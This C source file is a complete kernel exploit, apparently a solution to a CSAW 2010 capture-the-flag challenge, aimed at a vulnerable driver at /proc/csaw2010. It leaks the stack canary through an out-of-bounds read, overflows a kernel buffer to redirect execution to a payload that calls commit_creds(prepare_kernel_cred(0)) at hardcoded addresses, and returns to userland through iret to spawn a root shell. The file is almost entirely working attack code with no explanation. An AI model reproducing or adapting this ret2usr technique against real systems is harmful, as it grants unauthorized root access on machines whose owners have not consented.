#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame {
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
} __attribute__((packed));

void launch_shell(void)
{
    execl("/bin/sh", "sh", NULL);
}

struct trap_frame tf;
void prepare_tf(void)
{
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &launch_shell;
    tf.esp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xc1067fc0;
void *(*commit_creds)(void *) KERNCALL = (void *) 0xc1067e20;
void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret;");
}

int main(int argc, char *argv[])
{
    int fd = open("/proc/csaw2010", O_RDWR);
    if (!fd) {
        printf("error\n");
        exit(1);
    }
    lseek(fd, 16, SEEK_CUR);
    char buffer[64];
    read(fd, buffer, 64);
    int i, j;
    for (i = 0; i < 4; i++) {
        for (j = 0; j < 16; j++) printf("%02x ", buffer[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", buffer[i*16+j] & 0xff);
        printf("\n");
    }
    char canary[4];
    memcpy(canary, buffer+0x20, 4);
    printf("CANARY:");
    for (i = 0; i < 4; i++) printf("%02x", canary[i] & 0xff);
    printf("\n");
    char exp[88];
    memset(exp, 0x41, 88);
    memcpy(exp+64, canary, 4);
    *((void **)(exp+64+4+4+4+4+4)) = &payload; 
    printf("[*]payload:%s\n", exp);
    printf("Triger bug:\n");
    prepare_tf();
    write(fd, exp, 88);
    return 0;
}

